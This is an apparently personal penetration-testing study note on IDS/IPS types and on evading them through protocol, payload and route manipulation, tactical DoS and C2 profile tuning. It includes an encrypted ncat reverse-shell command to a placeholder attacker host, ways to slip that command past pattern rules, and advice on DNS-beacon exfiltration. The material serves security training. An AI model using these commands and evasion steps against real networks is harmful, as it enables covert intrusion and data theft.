Knowing what systems are in place on the network is an essential part for our engagements. As well as, knowing and detecting the difference between IDS and an IPS, [[Snort]] for example is a network intrusion detection and intrusion prevention system. So it can be set up as an IDS or an IPS. For it to function as an IPS it needs some way to block (drop) malicious connections. This capability requires Snort to be set up as `inline` and to bridge two or more network cards.
IDS setups can be divided based on their location in the network into:
- Host-based IDS (HIDS)
- Network-based IDS (NIDS)
The HIDS is installed on an OS along with the other running applications. This will give the HIDS the ability to monitor the traffic going in and out of the host, as well as, to monitor the processes running on the host.
The NIDS is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic.
# IDS Engine Types
We have two main types of IDs:
1. Signature-based: Requiring full knowledge of malicious traffic, we need to feed the characteristics of malicious traffic.
2. Anomaly-based: This requires the IDS to have knowledge of what regular traffic looks like. So we need to teach it to recognize normal traffic either by using ML or manual rules. This way it can recognize when something deviates from the normal traffic and tag it as malicious.
The signature based behavior is the same that we may find [[Antivirus|AV]] software, as it checks for malicious traffic and everything else is considered normal. While an anomaly-based IDS recognizes normal traffic. This approach is more akin to how we perceive things, we have certain expectations for speed, performance and such when we do somethings so anything that deviates from that may be a sign of something wrong.

# Evasion via Protocol Manipulation
Evading a signature-based IDs/IPS requires that we manipulate our traffic so that it does not match any IDS/IPS signatures. There are four general approaches we might consider for evasion, protocol manipulation being the first going to consider.
This methods includes:
- Relying on a different protocol
- Manipulating (source) TCP/UDP port
- Using Session splicing (IP packet fragmentation)
- Sending invalid packets
## Rely on a Different Protocol
The IDS/IPS system bight be configured to block certain protocols and allow others. For example, we might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack. We can use the knowledge we have gathered on the target to design our attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443, unless a local proxy is used. Now, of course this is something that entirely depends on both the necessities and policies of our target so this may require some trial and error, just careful with the noise.

## Manipulate (Source) TCP/UDP Port
Generally speaking, the TCP and UDP source and destination ports are always inspected even by the most basic solutions. Without Deep Packet Inspection (DPI), the port numbers are the main indicator of the service being used. So using port 22 will be interpreted as SSH traffic unless the security solution can analyze the data carried by the TCP segments.
Depending on the target security solution, we can make our port scanning traffic resemble web browsing or DNS queries. If we are using [[Nmap]], we can add the option `-g PORT` to make Nmap send all its traffic from a specific source port number.
While scanning a target, we can use `nmap -sS -Pn -g 80 -F TargetIP` to make it so it our port scanning traffic appears to be with an HTTP server, superficially at least.

## Use Session Splicing (IP Packet Fragmentation)
Another approach in IPv4 is IP packet fragmentation, i.e. session splicing. The assumption is that if we break the packet related to an attack into smaller packets, we will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, we can divide our payload among multiple packets. Unless the IDS reassembles the packets, the rule won't be triggered.
Nmap offers a few options to fragment packets, we can add:
- `-f` to set the data in the IP packet to 8 bytes
- `-ff` to limit the data in the IP packet to 16 bytes at most
- `--mtu SIZE` to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.
If we wanted to splice all packets into specific sizes, we could use a program such as [[Fragroute]]. `fragroute` can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple packet fragmentation, it would be enough to use a configuration file  with `ip_frag SIZE` to fragment the IP data according to the provided size. The size should be a multiple of 8.
For example, we can create a configuration file `fragroute.conf` with one line, `ip_frag 16` to fragment packets where data fragments don't exceed 16 bytes. Then we can run the command `fragroute -f fragroute.conf HOST`. The host is the destination to which we would send the fragments to.

## Sending Invalid Packets
Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might process an invalid packet, while the target system might ignore it. Thus requiring some experimentation or inside knowledge.
Nmap makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have:
- Invalid TCP/UDP checksum
- Invalid TCP flags
We can send packets with a wrong checksum using the option `--badsum`. An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program.
Nmap also lets us send packets with custom TCP flags, including invalid ones. The option `--scanflags` lets us choose which flags we want to set.
- `URG` for Urgent
- `ACK` for Acknowledge
- `PSH` for Push
- `RST` for Reset
- `SYN` for Synchronize
- `FIN` for Finish
For example, if we wanted to set the flags Synchronize, Reset and Finish at the same time, we could use `--scanflags SYNRSTFIN`.
If we want to craft packets with custom fields, whether valid or invalid, we might want to consider a tool such as [[hping3]]. This are some options to use it.
- `-t` `--ttl` to set the TTL in the IP header
- `-b` or `--badsum` to send packets with a bad UDP/TCP checksum
- `-S`, `-A`, `-P`, `-U`, `-F`, `-R` to set the TCP SYN, ACK, PUSH, URG, FIN and RST flags

# Evasion via Payload Manipulation
Evasion via payload manipulation includes:
- Obfuscating and encoding the payload
- Encrypting the communication channel
- Modifying the shellcode
## [[Obfuscation|Obfuscating]] and [[AV Evasion Shellcode#Encoding and Encryption|Encoding]] the Payload
Because the IDS rules need to be very specific, we can often make minor changes to avoid detection. These changes include adding extra bytes, obfuscating the attack data, encrypting the communication, etc.
There are multiple things that we could do here to bypass certain conditions, for the most basic of rules we could just `base64` encrypt it to get around. Depending on the signature matching we could also try URL encoding. Or even use the Escaped Unicode, as some applications will still process our input and execute it if we use use escaped Unicode. We could use [Cyberchef](https://gchq.github.io/CyberChef/) for most of these.

## [[AV Evasion Shellcode#Encoding and Encryption|Encrypt]] the Communication Channel
Because an IDS/IPS won't inspect encrypted data, we can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
One direct approach is to create the necessary encryption key on our system and set `ncat` to use the encryption key to enforce encryption as it listens for incoming connections.
First we create the key
```sh
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=website.name.com/O=OrganizationName/C=Country' -nodes -keyout Private.key -out Certificate.crt
```
In here we use `openssl` to request (`req`) that we want an X.509 certificate (`-x509`) using RSA with a size of 4096 bits (`-newkey rsa:4096`), it will be valid for a year (`-day 365`) and it will have the data that we give it, such as organization, website and country (`-subj '/CN...try'`), it will not encrypt the private key (`-nodes`), and it will output both the private key and the certificate (`-keyout *.key -out *.crt`).
Now, we can start listening while using the key for encrypting the communication with the client
```sh
ncat -lnvp 4443 --ssl-key Private.key --ssl-cert Certificate.crt 
```
We start `ncat` in listening mode and provide it both the private key and the certificate.
Finally we connect from the target
```sh
ncat --ssl AttackerIP 4443 -e /bin/bash
```
## Modifying the data
Considering a simple case where we just want to use `ncat` to connect back to our listener. `ncat --ssl AttackerIP 4443 -e /bin/bash`. An IPS could check for certain patterns on our command to flag it as malicious
- Scanning for things like `ncat --ssl` to not allow encrypted connections can be bypassed by adding more spaces like so `ncat   --ssl`.
- Prohibiting certain ports
- Not allowing the use of `/bin/bash`, we could maybe use another like `/bin/sh` or just `bash`.
- If they are looking for `ncat` then simple changes to the command won't work, at this point we may consider using other techniques depending on the target system/applications, maybe the use of `nc`, `socat`, etc.

# Evasion via Route Manipulation
This includes:
- Relying on source routing
- Using Proxy Servers
## Relying on Source Routing
In many cases, we can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option `--ip-options`. It offers loose and strict routing:
- Loose routing can be specified using `L`. Like `--ip-options "L 10.0.0.1 10.0.0.255"` requests that our scan packets are routed through the two provided IP addresses.
- Strict routing can be specified using `S`. Strict routing requires you to set every hop between your system and the target host. Like `--ip-options "S 10.0.0.1 10.0.0.128 10.0.0.255"` specifies that the packets go via these three hops before reaching the target host.
## Using Proxy Servers
The use of proxy servers can help hide our source. [[Nmap]] offers the option `--proxies` that takes a list of a comma-separated lists of proxy URLs. Each URL should be expressed in the format `protocol://host:port`. Valid protocols are HTTP and SOCKS4.
So for example, instead of running `nmap -sS 10.10.10.10` we would edit our command to be something like
```sh
nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4443 10.10.10.10
```
This way we would make our scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching our target. Note that finding a reliable proxy requires some trial and error before we can rely on it to hide our Nmap scan source
If we use our web browser to connect to the target, it would be a simple task to pass our traffic via a proxy server. Other network tools usually provide their own proxy settings that we can use to hide our traffic source.
# Evasion via Tactical DoS
This includes
- DoS against IDS/IPS
- DoS against the logging server
Normally an IDS/IPS requires a high processing power as the number of rules grow as well as the volume of the network traffic. Specially in the case of an IDS, whose functionality is to log traffic information. In these cases we might find beneficial if we can:
- Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
- Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.
If our target is the IDS operator, we could cause a significant number of false positives just make their life a living hell, and burn them out.
Also note that this approach is everything but stealthy, so it is just not a good idea if we want to go for a pacifist-stealth route

# [[C2]] Evasion
Some frameworks offer malleable C2 profiles. These allow us to fine-tune some aspects of our C2 to evade IDS/IPS systems. If we are using a framework like this it is pretty worthy to create a custom profile instead of relying on the default one.
Some of the things we can control are
- User-Agent: The framework we are using can expose us via its default user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm our settings.
- Sleep Time: The sleep time allows us to control the callback interval between beacon check-ins. Changing this allows us to control how often the infected system will attempt to beacon back to the C2 server.
- Jitter: This will add some randomness to the sleep time, usually a ±percentage. Allowing us to look more natural.
- SSL Certificate: Using our SSL certificate will significantly improve our chances of evading detection. Very worthy.
- DNS Beacon: Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data.